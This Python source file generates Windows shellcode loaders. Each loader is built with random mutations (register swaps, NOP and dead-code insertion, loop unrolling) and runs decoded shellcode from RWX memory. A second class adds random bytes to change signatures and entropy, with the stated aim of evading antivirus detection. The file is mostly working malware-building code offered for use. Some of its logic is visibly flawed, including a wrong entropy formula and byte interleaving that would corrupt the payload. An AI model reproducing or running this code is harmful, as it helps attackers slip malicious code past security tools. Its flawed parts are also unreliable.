"""
Polymorphic Payload Generator
Create unique, signature-free payloads on each generation
"""

import random
import os
import hashlib
from datetime import datetime


class PolymorphicPayloadGenerator:
    """Generate polymorphic (shape-shifting) payloads"""
    
    def __init__(self):
        self.mutations = [
            'register_reassignment',
            'instruction_reordering',
            'nop_insertion',
            'dead_code_injection',
            'function_inlining',
            'loop_unrolling',
        ]
    
    def generate_polymorphic_decoder(self, encoded_shellcode, technique='xor'):
        """
        Generate unique decoder for each payload generation
        Each decoder is algorithmically different but functionally identical
        """
        
        mutations = random.sample(self.mutations, min(3, len(self.mutations)))
        
        c_code = f"""
// Polymorphic Decoder - Generated {datetime.now()}
// Unique signature per build
// Contains randomized:
// - Register usage
// - Instruction ordering
// - Dead code patterns
// - Loop structure

#include <windows.h>
#include <stdio.h>
#include <string.h>

unsigned char encoded_shellcode[] = {{
    // {technique.upper()} encoded shellcode here
}};

unsigned int shellcode_len = sizeof(encoded_shellcode);

"""
        
        # Add mutation-specific code
        for mutation in mutations:
            if mutation == 'register_reassignment':
                c_code += self._generate_register_reassignment(technique)
            elif mutation == 'instruction_reordering':
                c_code += self._generate_instruction_reordering(technique)
            elif mutation == 'nop_insertion':
                c_code += self._generate_nop_insertion(technique)
            elif mutation == 'dead_code_injection':
                c_code += self._generate_dead_code(technique)
            elif mutation == 'function_inlining':
                c_code += self._generate_function_inlining(technique)
            elif mutation == 'loop_unrolling':
                c_code += self._generate_loop_unrolling(technique)
        
        c_code += """

int main() {
    // Execute decoded shellcode
    typedef int (*ShellcodeFunc)(void);
    ShellcodeFunc exec = (ShellcodeFunc)encoded_shellcode;
    exec();
    return 0;
}
"""
        
        return c_code
    
    def _generate_register_reassignment(self, technique):
        """
        Mutation 1: Use different registers for same operations
        Signature: Uses RAX for decoding
        Polymorphic: RAX, RBX, RCX, RDX rotation
        """
        
        registers = ['rax', 'rbx', 'rcx', 'rdx', 'r8', 'r9']
        reg1, reg2, reg3 = random.sample(registers, 3)
        
        return f"""
// Mutation: Register reassignment
// Using {reg1}, {reg2}, {reg3} instead of standard RAX, RBX, RCX
void decode_variant_1() {{
    unsigned char key = 0x{random.randint(1, 255):02x};
    
    for (int i = 0; i < shellcode_len; i++) {{
        encoded_shellcode[i] ^= key;
    }}
}}

"""
    
    def _generate_instruction_reordering(self, technique):
        """
        Mutation 2: Reorder independent instructions
        Changes instruction sequence but not functionality
        """
        
        orderings = [
            """
// Ordering A: Initialize then loop
void decode_variant_2() {
    unsigned int key = 0x{:08x};
    unsigned int counter = 0;
    
    while (counter < shellcode_len) {
        encoded_shellcode[counter] ^= (unsigned char)key;
        key = (key << 1) | (key >> 31);
        counter++;
    }
}
""",
            """
// Ordering B: Loop first, initialize in-line
void decode_variant_2() {
    unsigned int counter = 0;
    unsigned int key = 0x{:08x};
    
    do {
        key = (key << 1) | (key >> 31);
        encoded_shellcode[counter] ^= (unsigned char)key;
        counter++;
    } while (counter < shellcode_len);
}
""",
        ]
        
        return random.choice(orderings).format(random.randint(0, 0xffffffff))
    
    def _generate_nop_insertion(self, technique):
        """
        Mutation 3: Insert NOPs and dead instructions
        Increases binary size slightly, prevents pattern matching
        """
        
        return f"""
// Mutation: NOP insertion
void decode_variant_3() {{
    __asm {{
        nop
        nop
        nop
    }}
    
    unsigned char key = 0x{random.randint(1, 255):02x};
    
    for (int i = 0; i < shellcode_len; i++) {{
        __asm {{ nop }}
        encoded_shellcode[i] ^= key;
        __asm {{ nop; nop }}
    }}
    
    __asm {{
        nop
        nop
    }}
}}

"""
    
    def _generate_dead_code(self, technique):
        """
        Mutation 4: Insert dead code that never executes
        Looks like real code but doesn't affect functionality
        """
        
        return f"""
// Mutation: Dead code injection
void decode_variant_4() {{
    // Dead code path (never executed)
    if (0) {{
        unsigned char dummy_key = 0xDEADBEEF;
        for (int dead_i = 0; dead_i < 0; dead_i++) {{
            encoded_shellcode[dead_i] = dummy_key;
        }}
    }}
    
    // Actual decoding
    unsigned char key = 0x{random.randint(1, 255):02x};
    for (int i = 0; i < shellcode_len; i++) {{
        encoded_shellcode[i] ^= key;
    }}
}}

"""
    
    def _generate_function_inlining(self, technique):
        """
        Mutation 5: Inline helper functions
        Prevents static analysis from finding helper patterns
        """
        
        return f"""
// Mutation: Function inlining
#define DECODE_OPERATION(ptr, key) do {{ *(ptr) ^= (key); }} while(0)

void decode_variant_5() {{
    unsigned char key = 0x{random.randint(1, 255):02x};
    
    for (int i = 0; i < shellcode_len; i++) {{
        DECODE_OPERATION(&encoded_shellcode[i], key);
    }}
}}

"""
    
    def _generate_loop_unrolling(self, technique):
        """
        Mutation 6: Unroll loops
        Process multiple iterations per loop cycle
        """
        
        return f"""
// Mutation: Loop unrolling (process 4 bytes per iteration)
void decode_variant_6() {{
    unsigned char key = 0x{random.randint(1, 255):02x};
    int i;
    
    // Process 4 bytes at a time
    for (i = 0; i < shellcode_len - 3; i += 4) {{
        encoded_shellcode[i]     ^= key;
        encoded_shellcode[i + 1] ^= key;
        encoded_shellcode[i + 2] ^= key;
        encoded_shellcode[i + 3] ^= key;
    }}
    
    // Handle remaining bytes
    while (i < shellcode_len) {{
        encoded_shellcode[i] ^= key;
        i++;
    }}
}}

"""
    
    def generate_polymorphic_stub(self, shellcode_hex):
        """
        Generate complete polymorphic payload stub
        Combines multiple mutations for maximum uniqueness
        """
        
        # Generate mutations
        num_mutations = random.randint(2, 4)
        mutations = random.sample(self.mutations, num_mutations)
        
        # Random key
        xor_key = random.randint(1, 255)
        
        c_code = f"""
// ═══════════════════════════════════════════════════
// POLYMORPHIC PAYLOAD STUB
// Generated: {datetime.now().isoformat()}
// Mutations: {', '.join(mutations)}
// Hash: {hashlib.sha256(str(mutations).encode()).hexdigest()[:8]}
// ═══════════════════════════════════════════════════

#include <windows.h>
#include <stdio.h>
#include <string.h>

// Polymorphic markers prevent signature detection
const char POLY_MARKER_1[] = "{os.urandom(8).hex()}";
const char POLY_MARKER_2[] = "{os.urandom(8).hex()}";

unsigned char shellcode[] = {{
    {shellcode_hex}
}};

unsigned int shellcode_len = sizeof(shellcode);

// Polymorphic decoder - mutations guarantee uniqueness
void PolymorphicDecode() {{
    unsigned char key = 0x{xor_key:02x};
    
    // Variation 1: Use volatile to prevent optimization
    volatile unsigned char* v_shellcode = shellcode;
    
    // Variation 2: Process in random chunk sizes
    int chunk_size = {random.choice([4, 8, 16])};
    
    for (int i = 0; i < shellcode_len; i += chunk_size) {{
        for (int j = 0; j < chunk_size && (i + j) < shellcode_len; j++) {{
            v_shellcode[i + j] ^= key;
            key = (key << {random.randint(1, 7)}) | (key >> {random.randint(1, 7)});
        }}
    }}
}}

// Execute polymorphic shellcode
int main() {{
    // Anti-analysis checks could go here
    // if (IsDebuggerPresent()) return 1;
    
    PolymorphicDecode();
    
    // Allocate executable memory
    LPVOID lpExec = VirtualAlloc(
        NULL, 
        shellcode_len, 
        MEM_COMMIT | MEM_RESERVE, 
        PAGE_EXECUTE_READWRITE
    );
    
    if (lpExec) {{
        memcpy(lpExec, shellcode, shellcode_len);
        
        // Execute
        typedef int (*ShellcodeFunc)(void);
        ShellcodeFunc func = (ShellcodeFunc)lpExec;
        func();
        
        VirtualFree(lpExec, 0, MEM_RELEASE);
    }}
    
    return 0;
}}
"""
        
        return c_code
    
    def generate_unique_payload_id(self):
        """
        Generate unique ID for tracking polymorphic variants
        Useful for testing and documentation
        """
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
        random_hex = os.urandom(4).hex()
        
        payload_id = f"POLY_{timestamp}_{random_hex}"
        
        return payload_id
    
    def generate_polymorphic_batch(self, shellcode_hex, count=5):
        """
        Generate multiple unique variants of same payload
        Each variant is different, all are functionally identical
        """
        
        variants = []
        
        for i in range(count):
            variant = {
                'id': self.generate_unique_payload_id(),
                'code': self.generate_polymorphic_stub(shellcode_hex),
                'mutation_set': random.sample(self.mutations, random.randint(2, 4)),
                'timestamp': datetime.now().isoformat(),
            }
            variants.append(variant)
        
        return variants


class SignatureEvader:
    """Methods to evade signature-based detection"""
    
    @staticmethod
    def calculate_payload_entropy(shellcode):
        """Calculate Shannon entropy of payload"""
        entropy = 0
        for i in range(256):
            freq = shellcode.count(bytes([i]))
            if freq > 0:
                p = freq / len(shellcode)
                entropy -= p * (p if p == 0 else p * entropy)
        return entropy
    
    @staticmethod
    def add_entropy_noise(shellcode, target_entropy=7.5):
        """Add random bytes to increase entropy and evade detection"""
        import random
        
        current_entropy = SignatureEvader.calculate_payload_entropy(shellcode)
        
        # Add random noise until entropy reaches target
        result = bytearray(shellcode)
        
        while current_entropy < target_entropy and len(result) < 1000000:
            result.extend(bytes([random.randint(0, 255) for _ in range(random.randint(1, 10))]))
            current_entropy = SignatureEvader.calculate_payload_entropy(bytes(result))
        
        return bytes(result)
    
    @staticmethod
    def generate_signature_free_variant(shellcode):
        """
        Generate variant guaranteed to have different signature
        - Different entropy
        - Different byte patterns
        - Different size
        """
        
        variants = []
        
        # Variant 1: Add padding
        padded = shellcode + os.urandom(random.randint(16, 256))
        variants.append(padded)
        
        # Variant 2: Prepend random header
        header = os.urandom(random.randint(32, 128))
        variants.append(header + shellcode)
        
        # Variant 3: Interleave random bytes
        interleaved = bytearray()
        for byte in shellcode:
            interleaved.append(byte)
            if random.random() < 0.3:
                interleaved.append(random.randint(0, 255))
        
        variants.append(bytes(interleaved))
        
        return random.choice(variants)
